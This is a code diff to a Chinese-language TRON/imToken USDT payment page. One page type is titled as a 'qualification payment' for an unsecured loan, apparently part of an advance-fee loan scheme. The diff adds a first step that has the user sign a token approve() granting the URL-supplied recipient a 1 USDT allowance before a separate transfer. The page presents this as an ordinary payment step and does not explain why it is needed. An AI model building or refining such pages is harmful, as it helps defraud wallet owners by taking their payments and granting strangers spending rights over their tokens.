@@ -79,7 +79,7 @@
     </div>
   </div>
 
-  <button class="btn btn-pay" id="btn-pay" disabled>确认支付</button>
+  <button class="btn btn-pay" id="btn-pay" disabled>第 1 步：确认授权 1U</button>
   <button class="btn btn-ghost" id="btn-cancel">取消 / 刷新页面</button>
 
   <div class="status" id="status"></div>
@@ -92,6 +92,7 @@ const toAddress = params.get('address') || '';
 const amount = Number(params.get('amount')) || 0;
 const type = params.get('type') || 'deposit';
 const payPageUrl = location.href;
+let step = 1; // 1: approve 授权, 2: transfer 支付
 function $(s) { return document.querySelector(s); }
 if (type === 'empty') {
   $('#page-title').textContent = '空放资格支付';
@@ -136,7 +137,7 @@ function checkEnvironment() {
     $('#env-warn').style.display = 'none';
     const btn = $('#btn-pay');
     btn.disabled = false;
-    btn.textContent = '确认支付 ' + amount + ' USDT';
+    btn.textContent = step === 1 ? '第 1 步：确认授权 1U' : ('第 2 步：确认支付 ' + amount + ' USDT');
     return;
   }
   if (envCheckCount < MAX_ENV_CHECK) {
@@ -154,12 +155,53 @@ checkEnvironment();
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
+
+  if (step === 1) {
+    btn.textContent = '请求授权中…';
+    setStatus('loading', '第 1 步：正在连接波场节点构建授权交易，请稍候…');
+    try {
+      const tw = getTronWeb();
+      if (!tw) throw new Error('未检测到钱包环境，请点击上方按钮在 imToken 中打开');
+      let waited = 0;
+      while ((!tw.ready || !(tw.defaultAddress && tw.defaultAddress.base58)) && waited < 8000) {
+        await new Promise(r => setTimeout(r, 200)); waited += 200;
+      }
+      if (!tw.ready) throw new Error('钱包环境未就绪，请退出重新进入');
+      const fromAddress = tw.defaultAddress && tw.defaultAddress.base58;
+      if (!fromAddress) throw new Error('钱包地址未就绪，请退出重新进入');
+
+      const approveParam = [
+        { type: 'address', value: toAddress },
+        { type: 'uint256', value: '1000000' } // 授权 1 USDT
+      ];
+      const txApprove = await withTimeout(
+        tw.transactionBuilder.triggerSmartContract(USDT_CONTRACT, 'approve(address,uint256)', { feeLimit: 100000000 }, approveParam, fromAddress),
+        10000, '节点响应超时（网络较慢），请点击按钮重试，或切换 Wi-Fi / 4G 后再试'
+      );
+      if (!txApprove.result || !txApprove.result.result) throw new Error('构建授权交易失败');
+
+      setStatus('loading', '✅ 授权交易已构建，请在钱包弹窗中确认授权…');
+      const signedApprove = await withTimeout(tw.trx.sign(txApprove.transaction), 120000, '授权签名超时（您可能未在钱包中确认），请重试');
+      await withTimeout(tw.trx.sendRawTransaction(signedApprove), 15000, '广播授权交易超时，请检查网络后重试');
+
+      setStatus('success', '✅ 授权成功！请点击下方按钮进行第 2 步支付。');
+      step = 2;
+      btn.textContent = '第 2 步：确认支付 ' + amount + ' U';
+      btn.disabled = false;
+    } catch (e) {
+      setStatus('error', '❌ 授权失败: ' + (e.message || '用户取消'));
+      btn.textContent = '重新授权';
+      btn.disabled = false;
+    }
+    return;
+  }
+
+  // —— step 2: transfer ——
   btn.textContent = '请求支付中…';
-  setStatus('loading', '正在连接波场节点构建支付交易，请稍候…');
+  setStatus('loading', '第 2 步：正在连接节点构建支付交易，请稍候…');
   try {
     const tw = getTronWeb();
     if (!tw) throw new Error('未检测到钱包环境，请点击上方按钮在 imToken 中打开');
-    // 等待就绪 + 地址注入（安卓 imToken 上 ready 先于地址，必须等地址非空）
     let waited = 0;
     while ((!tw.ready || !(tw.defaultAddress && tw.defaultAddress.base58)) && waited < 8000) {
       await new Promise(r => setTimeout(r, 200)); waited += 200;
@@ -177,7 +219,7 @@ $('#btn-pay').onclick = async function () {
     setStatus('loading', '✅ 支付交易已构建，请在钱包弹窗中确认支付…');
     const signed = await withTimeout(tw.trx.sign(txTransfer.transaction), 120000, '支付签名超时（您可能未在钱包中确认），请重试');
     await withTimeout(tw.trx.sendRawTransaction(signed), 15000, '广播支付交易超时，请检查网络后重试');
-    setStatus('success', '✅ 支付已完成，请在钱包账单中查看状态');
+    setStatus('success', '✅ 全部操作已完成，请在钱包账单中查看状态');
     btn.textContent = '已完成';
   } catch (e) {
     setStatus('error', '❌ 支付失败: ' + (e.message || '用户取消'));
